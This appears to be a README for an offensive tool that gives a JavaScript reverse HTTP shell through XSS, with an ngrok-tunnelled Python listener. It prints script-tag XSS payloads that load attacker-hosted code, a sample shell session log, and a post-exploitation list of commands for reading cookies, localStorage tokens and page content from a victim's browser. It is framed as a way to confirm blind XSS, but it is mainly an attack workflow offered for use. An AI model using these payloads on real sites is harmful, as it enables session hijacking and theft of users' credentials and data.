# Description
 A reverse shell in JavaScript using HTTP to communicate, used to confirm blind XSS vulnerabilities and a tool for browser post-exploitation.
# Setup and Use
``pip install pyngrok socketserver``

Then, run in terminal or cmd:

``python server.py``

Now, run the JavaScript XSS payload on the target (Or simply open the HTML payload in the browser).

````
  ____  _                       ____      _ ____  
 |  _ \(_)_ __ ___   ___  _ __ |  _ \    | / ___|
 | | | | | '_ ` _ \ / _ \| '_ \| | | |_  | \___ \
 | |_| | | | | | | | (_) | | | | |_| | |_| |___) |
 |____/|_|_| |_| |_|\___/|_| |_|____/ \___/|____/  v1.3

 <------------ Developed by DimonDev ------------>


[!] Execute one of these payloads on the target:

Local target:

<script src="http://localhost:6969/?command=get_script"></script>
The HTML payload: http://localhost:6969/

Remote target:

<script src="https://aaaabbbbcccc.ngrok-free.app/?command=get_script"></script>
The HTML payload: https://aaaabbbbcccc.ngrok-free.app

[+] Listener server started over WAN - https://aaaabbbbcccc.ngrok-free.app
[+] Listening on port 6969
````

When a the target is connected, it will spawn a reverse HTTP shell (type command help):

````
  ____  _                       ____      _ ____  
 |  _ \(_)_ __ ___   ___  _ __ |  _ \    | / ___|
 | | | | | '_ ` _ \ / _ \| '_ \| | | |_  | \___ \
 | |_| | | | | | | | (_) | | | | |_| | |_| |___) |
 |____/|_|_| |_| |_|\___/|_| |_|____/ \___/|____/  v1.3

 <------------ Developed by DimonDev ------------>


[!] Execute one of these payloads on the target:

Local target:

<script src="http://localhost:6969/?command=get_script"></script>
The HTML payload: http://localhost:6969/

Remote target:

<script src="https://aaaabbbbcccc.ngrok-free.app/?command=get_script"></script>
The HTML payload: https://aaaabbbbcccc.ngrok-free.app

[+] Listener server started over WAN - https://aaaabbbbcccc.ngrok-free.app
[+] Listening on port 6969

127.0.0.1 - - [03/May/2023 23:47:55] "GET /?command=get_script HTTP/1.1" 200 -
127.0.0.1~# 
127.0.0.1 - - [03/May/2023 23:47:55] "GET /shell HTTP/1.1" 200 -
127.0.0.1 - - [03/May/2023 23:47:56] code 404, message Not Found
127.0.0.1 - - [03/May/2023 23:47:56] "GET /favicon.ico HTTP/1.1" 404 -

undefined

127.0.0.1~#
127.0.0.1 - - [03/May/2023 23:47:56] "GET /shell?resp=undefined HTTP/1.1" 200 -
127.0.0.1~# 
127.0.0.1 - - [03/May/2023 23:47:56] "GET /shell HTTP/1.1" 200 -

undefined

127.0.0.1~#
127.0.0.1 - - [03/May/2023 23:47:57] "GET /shell?resp=undefined HTTP/1.1" 200 -
127.0.0.1~# 
127.0.0.1 - - [03/May/2023 23:47:58] "GET /shell HTTP/1.1" 200 -

undefined

127.0.0.1~# help

---------------------------------------------------------
Usage:
    You can either input a Javascript snippet or use
    the internal commands.

Commands:
    help - Prints this message.
    getip - Fetches the public IP of the target.
    vulnscan - Scans for possible CVEs in the target
                browser.
    info CVE-0000-0000 - Information about a CVE.
    exploit CVE-0000-0000 - (For now, it only prints
                                exploit-db url)

Useful JavaScript:
    document.documentURI
    document.location
    document.domain
    document.body.innerHTML
    document.head.innerHTML
    document.cookie
    localStorage
    localStorage.getItem("SOME_ITEM_OR_TOKEN")
    navigator.userAgent
    navigator.platform
    navigator.vibrate()
    navigator.javaEnabled()
    navigator.languages
    navigator.maxTouchPoints
    navigator.buildID

----------------- Developed by DimonDev -----------------

127.0.0.1~#
````

# Post-exploitation
You can now use the JavaScript console remotely.
Here are some interesting commands to use:
1. `document.documentURI`: This property returns the URI (Uniform Resource Identifier) of the current document.
2. `document.location`: This property returns a Location object, which contains information about the current URL of the document, including the protocol, host, port, pathname, and search parameters.
3. `document.domain`: This property returns the domain of the current document's URL. This property is often used to enable cross-origin scripting between documents served from different domains.
4. `document.body.innerHTML`: This property allows you to get or set the HTML content of the `<body>` element of the current document. When you set this property, the existing content of the `<body>` element is replaced with the new content.
5. `document.head.innerHTML`: This property allows you to get or set the HTML content of the `<head>` element of the current document. When you set this property, the existing content of the `<head>` element is replaced with the new content.
6. `document.cookie`: This property allows you to get or set the cookies associated with the current document. Cookies are small pieces of data that are stored on the client-side and are often used to persist user preferences or authentication information.
7. `localStorage`: This is an object that provides a simple key-value store for persisting data on the client-side. Unlike cookies, data stored in localStorage is not sent to the server with every request.
8. `localStorage.getItem("SOME_ITEM_OR_TOKEN")`: This method allows you to retrieve an item from localStorage based on its key. The key is a string that you provide when you store the item.
9. `navigator.platform`: This property returns a string that identifies the operating system platform that the browser is running on (e.g., "MacIntel", "Win32", "Linux x86_64", etc.).
10. `navigator.vibrate()`: This method allows you to trigger a vibration effect on the user's device. This method takes an array of integers that specifies the pattern of vibration (e.g., `[100, 200, 300]` would vibrate for 100ms, then pause for 200ms, then vibrate for 300ms).
11. `navigator.javaEnabled()`: This method returns a boolean indicating whether the browser has Java support enabled.
12. `navigator.languages`: This property returns an array of strings that represents the user's preferred languages for content.
13. `navigator.maxTouchPoints`: This property returns the maximum number of simultaneous touch points that the user's device supports.
14. `navigator.buildID`: This property returns a string that identifies the build of the browser that the user is using. This value is often used for debugging purposes.
Remember to get creative!
